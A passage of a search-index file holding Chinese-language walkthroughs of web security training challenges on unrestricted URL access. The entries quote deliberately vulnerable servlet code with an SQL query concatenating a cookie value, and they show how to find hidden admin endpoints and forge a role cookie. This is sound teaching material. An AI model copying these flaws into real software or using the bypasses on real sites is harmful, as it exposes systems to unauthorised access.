\"</p>\";","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#_3","text":"\u5c06post\u8bf7\u6c42\u7684\u5730\u5740 /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99 \u4fee\u6539\u4e3a /challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992 \u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#_4","text":"\u4efb\u4f55URL\u90fd\u9700\u8981\u6dfb\u52a0\u6b63\u786e\u7684\u8bbf\u95ee\u9650\u5236","title":"\u603b\u7ed3"},{"location":"vul/Failure-To-Restrict-URL-Access-Challenge-1.html#_5","text":"src/main/resources/i18n/challenges/urlAccess/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c99_zh.properties","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html","text":"Failure to Restrict URL Access Challenge 2(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u627e\u5230\u4ee5\u7ba1\u7406\u5458\u8d26\u53f7\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u67e5\u770b\u9875\u9762\uff0c\u53ea\u6709\u4e00\u4e2a\u6309\u94ae\uff0c\u53d1\u9001\u8bf7\u6c42\u672a\u53d1\u73b0\u6709\u4ec0\u4e48\u529f\u80fd POST /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa HTTP/1.1 guestData=sOdjh318UD8ismcoa98smcj21dmdoaoIS9 \u5bf9\u5e94\u89e3\u6790\u4ee3\u7801 try { String userData = request.getParameter(\"adminData\"); //\u7528\u6237\u8bf7\u6c42\u53c2\u6570 boolean tamperedRequest = !userData.equalsIgnoreCase(\"youAreAnAdminOfAwesomenessWoopWoop\"); //\u5224\u65ad\u662f\u5426\u662f\u8fd9\u4e2a\u7ba1\u7406\u5458\u503c if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) { String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"admin.clicked\") + \"</h2>\" + \"<p>\" + bundle.getString(\"admin.keyMessage.1\") + \"<br /> \" + \"<a>\" + userKey + \"</a><br />\" + bundle.getString(\"admin.keyMessage.2\") + \"</p>\"; } else htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.failue\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.failue.message\") + \"</p>\" + \"<!-- \" + Encode.forHtml(userData) + \" -->\"; } \u4f46\u6211\u4eec\u8bf7\u6c42\u7684\u503c\u662f sOdjh318UD8ismcoa98smcj21dmdoaoIS9 \u5728\u770b\u54ea\u91cc\u80fd\u627e\u5230 youAreAnAdminOfAwesomenessWoopWoop \u8fd9\u4e2a\u503c? \u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5982\u4e0b\u529f\u80fd eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('$(\"#A\").f(3(){$(\"#8\").5(\"9\");$(\"#7\").4(\"1\");$(\"#2\").5(\"1\",3(){e 0=$.h({i:\"j\",b:\"v\",c:{u:\"t\",},d:g});m(0.6==k){$(\"#2\").a(0.s)}q{$(\"#2\").a(\"<p> l r n: \"+0.6+\" \"+0.o+\"</p>\")}$(\"#2\").4(\"1\",3(){$(\"#7\").5(\"9\",3(){$(\"#8\").4(\"1\")})})})});$(\"#w\").f(3(){$(\"#8\").5(\"9\");$(\"#7\").4(\"1\");$(\"#2\").5(\"1\",3(){e 0=$.h({i:\"j\",b:\"x\",c:{y:\"z\",},d:g});m(0.6==k){$(\"#2\").a(0.s)}q{$(\"#2\").a(\"<p> l r n: \"+0.6+\" \"+0.o+\"</p>\")}$(\"#2\").4(\"1\",3(){$(\"#7\").5(\"9\",3(){$(\"#8\").4(\"1\")})})})});',37,37,'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|sOdjh318UD8ismcoa98smcj21dmdoaoIS9|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{})) \u5c06eval \u4fee\u6539\u4e3a console.log \u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u6267\u884c $(\"#leForm\").submit(function() { $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function() { var ajaxCall = $.ajax({ type: \"POST\", url: \"278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa\", data: { guestData: \"sOdjh318UD8ismcoa98smcj21dmdoaoIS9\", }, async: false }); if (ajaxCall.status == 200) { $(\"#resultsDiv\").html(ajaxCall.responseText) } else { $(\"#resultsDiv\").html(\"<p> An Error Occurred: \" + ajaxCall.status + \" \" + ajaxCall.statusText + \"</p>\") } $(\"#resultsDiv\").show(\"slow\", function() { $(\"#loadingSign\").hide(\"fast\", function() { $(\"#submitButton\").show(\"slow\") }) }) }) }); $(\"#leAdministratorFormOfAwesomeness\").submit(function() { $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function() { var ajaxCall = $.ajax({ type: \"POST\", url: \"278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin\", data: { adminData: \"youAreAnAdminOfAwesomenessWoopWoop\", }, async: false }); if (ajaxCall.status == 200) { $(\"#resultsDiv\").html(ajaxCall.responseText) } else { $(\"#resultsDiv\").html(\"<p> An Error Occurred: \" + ajaxCall.status + \" \" + ajaxCall.statusText + \"</p>\") } $(\"#resultsDiv\").show(\"slow\", function() { $(\"#loadingSign\").hide(\"fast\", function() { $(\"#submitButton\").show(\"slow\") }) }) }) }); undefined \u53d1\u73b0\u7ba1\u7406\u5458\u529f\u80fd\u4ee3\u7801 \uff0c\u8bf7\u6c42\u7684\u8def\u5f84 278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin \u53c2\u6570\u6570 adminData=youAreAnAdminOfAwesomenessWoopWoop \u89e3\u9898\u6b65\u9aa4 \u00b6 \u8bf7\u6c42\u5730\u5740 /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin \u8bf7\u6c42\u53c2\u6570 adminData=youAreAnAdminOfAwesomenessWoopWoop \u603b\u7ed3 \u00b6 \u524d\u7aef\u52a0\u5bc6\u6bd4\u8f83\u5f31\uff0c\u82b1\u4e00\u4e9b\u65f6\u95f4\uff0c\u662f\u53ef\u4ee5\u7834\u89e3\u51fa\u6765\u7684","title":"Failure to Restrict URL Access Challenge 2(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 2)"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html#failure-to-restrict-url-access-challenge-2url-2","text":"","title":"Failure to Restrict URL Access Challenge 2(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 2)"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html#_1","text":"\u9700\u8981\u627e\u5230\u4ee5\u7ba1\u7406\u5458\u8d26\u53f7\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html#_2","text":"\u67e5\u770b\u9875\u9762\uff0c\u53ea\u6709\u4e00\u4e2a\u6309\u94ae\uff0c\u53d1\u9001\u8bf7\u6c42\u672a\u53d1\u73b0\u6709\u4ec0\u4e48\u529f\u80fd POST /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa HTTP/1.1 guestData=sOdjh318UD8ismcoa98smcj21dmdoaoIS9 \u5bf9\u5e94\u89e3\u6790\u4ee3\u7801 try { String userData = request.getParameter(\"adminData\"); //\u7528\u6237\u8bf7\u6c42\u53c2\u6570 boolean tamperedRequest = !userData.equalsIgnoreCase(\"youAreAnAdminOfAwesomenessWoopWoop\"); //\u5224\u65ad\u662f\u5426\u662f\u8fd9\u4e2a\u7ba1\u7406\u5458\u503c if(!tamperedRequest) log.debug(\"No request tampering detected\"); else log.debug(\"User Submitted - \" + userData); if(!tamperedRequest) { String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"admin.clicked\") + \"</h2>\" + \"<p>\" + bundle.getString(\"admin.keyMessage.1\") + \"<br /> \" + \"<a>\" + userKey + \"</a><br />\" + bundle.getString(\"admin.keyMessage.2\") + \"</p>\"; } else htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.failue\") + \"</h2>\" + \"<p>\" + bundle.getString(\"response.failue.message\") + \"</p>\" + \"<!-- \" + Encode.forHtml(userData) + \" -->\"; } \u4f46\u6211\u4eec\u8bf7\u6c42\u7684\u503c\u662f sOdjh318UD8ismcoa98smcj21dmdoaoIS9 \u5728\u770b\u54ea\u91cc\u80fd\u627e\u5230 youAreAnAdminOfAwesomenessWoopWoop \u8fd9\u4e2a\u503c? \u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5982\u4e0b\u529f\u80fd eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('$(\"#A\").f(3(){$(\"#8\").5(\"9\");$(\"#7\").4(\"1\");$(\"#2\").5(\"1\",3(){e 0=$.h({i:\"j\",b:\"v\",c:{u:\"t\",},d:g});m(0.6==k){$(\"#2\").a(0.s)}q{$(\"#2\").a(\"<p> l r n: \"+0.6+\" \"+0.o+\"</p>\")}$(\"#2\").4(\"1\",3(){$(\"#7\").5(\"9\",3(){$(\"#8\").4(\"1\")})})})});$(\"#w\").f(3(){$(\"#8\").5(\"9\");$(\"#7\").4(\"1\");$(\"#2\").5(\"1\",3(){e 0=$.h({i:\"j\",b:\"x\",c:{y:\"z\",},d:g});m(0.6==k){$(\"#2\").a(0.s)}q{$(\"#2\").a(\"<p> l r n: \"+0.6+\" \"+0.o+\"</p>\")}$(\"#2\").4(\"1\",3(){$(\"#7\").5(\"9\",3(){$(\"#8\").4(\"1\")})})})});',37,37,'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|sOdjh318UD8ismcoa98smcj21dmdoaoIS9|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{})) \u5c06eval \u4fee\u6539\u4e3a console.log \u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u6267\u884c $(\"#leForm\").submit(function() { $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function() { var ajaxCall = $.ajax({ type: \"POST\", url: \"278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa\", data: { guestData: \"sOdjh318UD8ismcoa98smcj21dmdoaoIS9\", }, async: false }); if (ajaxCall.status == 200) { $(\"#resultsDiv\").html(ajaxCall.responseText) } else { $(\"#resultsDiv\").html(\"<p> An Error Occurred: \" + ajaxCall.status + \" \" + ajaxCall.statusText + \"</p>\") } $(\"#resultsDiv\").show(\"slow\", function() { $(\"#loadingSign\").hide(\"fast\", function() { $(\"#submitButton\").show(\"slow\") }) }) }) }); $(\"#leAdministratorFormOfAwesomeness\").submit(function() { $(\"#submitButton\").hide(\"fast\"); $(\"#loadingSign\").show(\"slow\"); $(\"#resultsDiv\").hide(\"slow\", function() { var ajaxCall = $.ajax({ type: \"POST\", url: \"278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin\", data: { adminData: \"youAreAnAdminOfAwesomenessWoopWoop\", }, async: false }); if (ajaxCall.status == 200) { $(\"#resultsDiv\").html(ajaxCall.responseText) } else { $(\"#resultsDiv\").html(\"<p> An Error Occurred: \" + ajaxCall.status + \" \" + ajaxCall.statusText + \"</p>\") } $(\"#resultsDiv\").show(\"slow\", function() { $(\"#loadingSign\").hide(\"fast\", function() { $(\"#submitButton\").show(\"slow\") }) }) }) }); undefined \u53d1\u73b0\u7ba1\u7406\u5458\u529f\u80fd\u4ee3\u7801 \uff0c\u8bf7\u6c42\u7684\u8def\u5f84 278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin \u53c2\u6570\u6570 adminData=youAreAnAdminOfAwesomenessWoopWoop","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html#_3","text":"\u8bf7\u6c42\u5730\u5740 /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin \u8bf7\u6c42\u53c2\u6570 adminData=youAreAnAdminOfAwesomenessWoopWoop","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-2.html#_4","text":"\u524d\u7aef\u52a0\u5bc6\u6bd4\u8f83\u5f31\uff0c\u82b1\u4e00\u4e9b\u65f6\u95f4\uff0c\u662f\u53ef\u4ee5\u7834\u89e3\u51fa\u6765\u7684","title":"\u603b\u7ed3"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html","text":"Failure to Restrict URL Access Challenge 3(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 3) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u627e\u5230\u8d85\u7ea7\u7ba1\u7406\u5458\u6743\u9650 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4 HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 userId=d3d9446802a44259755d38e6d163e820&secure=true \u5bf9\u5e94\u529f\u80fd\u4ee3\u7801 log.debug(levelName + \" servlet accessed by: \" + ses.getAttribute(\"userName\").toString()); Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"currentPerson\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"MrJohnReillyTheSecond\")) // cookie\u4e2d\u4fdd\u5b58\u7684\u6743\u9650 { log.debug(\"Super Admin Cookie detected\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"admin.superAdminClub\") + \"</h2>\" + \"<p>\" + bundle.getString(\"admin.superAdminClub.keyMessage\") + \" \" + \"<a>\" + userKey + \"</a>\" + \"</p>\"; } else if (!decodedCookie.equals(\"aGuest\")) { log.debug(\"Tampered role cookie detected: \" + decodedCookie); htmlOutput = \"<!-- \" + bundle.getString(\"response.invalidUser\") + \" -->\"; } \u600e\u6837\u627e\u5230\u7ba1\u7406\u5458\u7684\u8d26\u53f7? \u53d1\u73b0\u9875\u9762\u8fd8\u6709\u4e2a\u9690\u85cf\u7684\u5730\u5740 e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList \u67e5\u770b\u4ee3\u7801\u5b58\u5728SQL\u6ce8\u5165 Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"currentPerson\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String currentUser = new String(\"aGuest\"); if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); currentUser = decodedCookie; } String ApplicationRoot = getServletContext().getRealPath(\"\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"UrlAccessThree\"); PreparedStatement callstmt; callstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userRole = \\\"admin\\\" OR userName = \\\"\" + currentUser + \"\\\";\"); log.debug(\"Getting User List\"); htmlOutput = new String(); ResultSet rs = callstmt.executeQuery(); while(rs.next()) { htmlOutput += Encode.forHtml(rs.getString(1)) + \"<br>\"; if(rs.getString(1).equalsIgnoreCase(\"MrJohnReillyTheSecond\")) { log.debug(\"Super Admin contained in response\"); } } \u901a\u8fc7\u8fd9\u4e2a\u6ce8\u5165\u70b9\uff0c\u53ef\u4ee5\u83b7\u5f97\u6240\u6709\u7528\u6237\u5217\u8868 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u9010\u4e2a\u7528\u6237\u540d\u66ff\u6362cookie\u503c\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6700\u7ec8\u53d1\u73b0 MrJohnReillyTheSecond \u8d26\u53f7\u53ef\u4ee5\u6210\u529f \u603b\u7ed3 \u00b6 \u5ba2\u6237\u7aef\u53c2\u6570\u4e0d\u53ef\u4fe1...","title":"Failure to Restrict URL Access Challenge 3(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 3)"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html#failure-to-restrict-url-access-challenge-3url-3","text":"","title":"Failure to Restrict URL Access Challenge 3(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee 3)"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html#_1","text":"\u9700\u8981\u627e\u5230\u8d85\u7ea7\u7ba1\u7406\u5458\u6743\u9650","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4 HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 userId=d3d9446802a44259755d38e6d163e820&secure=true \u5bf9\u5e94\u529f\u80fd\u4ee3\u7801 log.debug(levelName + \" servlet accessed by: \" + ses.getAttribute(\"userName\").toString()); Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"currentPerson\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"MrJohnReillyTheSecond\")) // cookie\u4e2d\u4fdd\u5b58\u7684\u6743\u9650 { log.debug(\"Super Admin Cookie detected\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"admin.superAdminClub\") + \"</h2>\" + \"<p>\" + bundle.getString(\"admin.superAdminClub.keyMessage\") + \" \" + \"<a>\" + userKey + \"</a>\" + \"</p>\"; } else if (!decodedCookie.equals(\"aGuest\")) { log.debug(\"Tampered role cookie detected: \" + decodedCookie); htmlOutput = \"<!-- \" + bundle.getString(\"response.invalidUser\") + \" -->\"; } \u600e\u6837\u627e\u5230\u7ba1\u7406\u5458\u7684\u8d26\u53f7? \u53d1\u73b0\u9875\u9762\u8fd8\u6709\u4e2a\u9690\u85cf\u7684\u5730\u5740 e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList \u67e5\u770b\u4ee3\u7801\u5b58\u5728SQL\u6ce8\u5165 Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"currentPerson\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String currentUser = new String(\"aGuest\"); if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); currentUser = decodedCookie; } String ApplicationRoot = getServletContext().getRealPath(\"\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"UrlAccessThree\"); PreparedStatement callstmt; callstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userRole = \\\"admin\\\" OR userName = \\\"\" + currentUser + \"\\\";\"); log.debug(\"Getting User List\"); htmlOutput = new String(); ResultSet rs = callstmt.executeQuery(); while(rs.next()) { htmlOutput += Encode.forHtml(rs.getString(1)) + \"<br>\"; if(rs.getString(1).equalsIgnoreCase(\"MrJohnReillyTheSecond\")) { log.debug(\"Super Admin contained in response\"); } } \u901a\u8fc7\u8fd9\u4e2a\u6ce8\u5165\u70b9\uff0c\u53ef\u4ee5\u83b7\u5f97\u6240\u6709\u7528\u6237\u5217\u8868","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html#_3","text":"\u9010\u4e2a\u7528\u6237\u540d\u66ff\u6362cookie\u503c\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6700\u7ec8\u53d1\u73b0 MrJohnReillyTheSecond \u8d26\u53f7\u53ef\u4ee5\u6210\u529f","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Failure-to-Restrict-URL-Access-Challenge-3.html#_4","text":"\u5ba2\u6237\u7aef\u53c2\u6570\u4e0d\u53ef\u4fe1...","title":"\u603b\u7ed3"},{"location":"vul/Failure-to-Restrict-URL-Access.html","text":"Failure to Restrict URL Access(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u5173\u5bc6\u94a5\u4fdd\u5b58\u5728\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u7684\u9875\u9762\u4e2d\uff0c\u9700\u8981\u627e\u5230\u8fd9\u4e2a\u9875\u9762 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u5728\u6253\u5f00\u9875\u9762\u4e2d\uff0c\u5728html\u5305\u542b\u4e00\u4e2a\u6ce8\u91ca\u4fe1\u606f <div id=\"hiddenDiv\" style=\"display: none;\"> <!-- \u8fd9\u4ec5\u663e\u793a\u7ed9\u7ba1\u7406\u5458 --> <a href=\"adminOnly/resultKey.jsp\"> \u7ba1\u7406\u5458\u7ed3\u679c\u9875\u9762 </a> </div> \u4ece\u6ce8\u91ca\u770b\uff0c\u8fd9\u4e2a\u662f\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u7684\u9875\u9762 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u9700\u8981\u8bbf\u95ee adminOnly/resultKey.jsp \u8fd9\u4e2a\u8def\u5f84\uff0c\u7531\u4e8e\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u5f53\u524d\u8def\u5f84\u662f /lessons/oed23498d53ad1d965a589e257d8366d74eb52ef955e103c813b592dba0477e3.jsp \u6240\u4ee5\u6700\u7ec8\u9700\u8981\u8bbf\u95ee\u7684\u8def\u5f84\u662f \u57df\u540d/lessons/adminOnly/resultKey.jsp \u6253\u5f00\u540e\u662f\u7a7a\u767d\u9875\u9762\uff0c\u9700\u8981\u67e5\u770b\u9875\u9762\u6e90\u7801 \u627e\u5230\u901a\u5173\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u7cfb\u7edf\u4e2d\u6ca1\u6709URL\u5730\u5740\u90fd\u5e94\u8be5\u8bbe\u7f6e\u9002\u5f53\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0d\u8981\u4ec5\u4ec5\u4f9d\u9760\u9690\u85cfURL\u5730\u5740,\u8fd9\u4e2a\u662f\u975e\u5e38\u4e0d\u53ef\u9760\u7684","title":"Failure to Restrict URL Access(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee)"},{"location":"vul/Failure-to-Restrict-URL-Access.html#failure-to-restrict-url-accessurl","text":"","title":"Failure to Restrict URL Access(\u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee)"},{"location":"vul/Failure-to-Restrict-URL-Access.html#_1","text":"\u901a\u5173\u5bc6\u94a5\u4fdd\u5b58\u5728\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u7684\u9875\u9762\u4e2d\uff0c\u9700\u8981\u627e\u5230\u8fd9\u4e2a\u9875\u9762","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Failure-to-Restrict-URL-Access.html#_2","text":"\u5728\u6253\u5f00\u9875\u9762\u4e2d\uff0c\u5728html\u5305\u542b\u4e00\u4e2a\u6ce8\u91ca\u4fe1\u606f <div id=\"hiddenDiv\" style=\"display: none;\"> <!-- \u8fd9\u4ec5\u663e\u793a\u7ed9\u7ba1\u7406\u5458 --> <a href=\"adminOnly/resultKey.jsp\"> \u7ba1\u7406\u5458\u7ed3\u679c\u9875\u9762 </a> </div> \u4ece\u6ce8\u91ca\u770b\uff0c\u8fd9\u4e2a\u662f\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u7684\u9875\u9762","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Failure-to-Restrict-URL-Access.html#_3","text":"\u9700\u8981\u8bbf\u95ee adminOnly/resultKey.jsp \u8fd9\u4e2a\u8def\u5f84\uff0c\u7531\u4e8e\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u5f53\u524d\u8def\u5f84\u662f /lessons/oed23498d53ad1d965a589e257d8366d74eb52ef955e103c813b592dba0477e3.jsp \u6240\u4ee5\u6700\u7ec8\u9700\u8981\u8bbf\u95ee\u7684\u8def\u5f84\u662f \u57df\u540d/lessons/adminOnly/resultKey.jsp \u6253\u5f00\u540e\u662f\u7a7a\u767d\u9875\u9762\uff0c\u9700\u8981\u67e5\u770b\u9875\u9762\u6e90\u7801 \u627e\u5230\u901a\u5173\u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Failure-to-Restrict-URL-Access.html#_4","text":"\u7cfb\u7edf\u4e2d\u6ca1\u6709URL\u5730\u5740\u90fd\u5e94\u8be5\u8bbe\u7f6e\u9002\u5f53\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0d\u8981\u4ec5\u4ec5\u4f9d\u9760\u9690\u85cfURL\u5730\u5740,\u8fd9\u4e2a\u662f\u975e\u5e38\u4e0d\u53ef\u9760\u7684","title":"\u603b\u7ed3"},{"location":"vul/Insecure-Cryptographic-Storage-Challenge-1.html","text":"Insecure Cryptographic Storage Challenge 1(\u4e0d\u5b89\u5168\u7684\u52a0\u5bc6\u5b58\u50a8 1 \u00b6 \u9898\u4ecb\u7ecd \u00b6 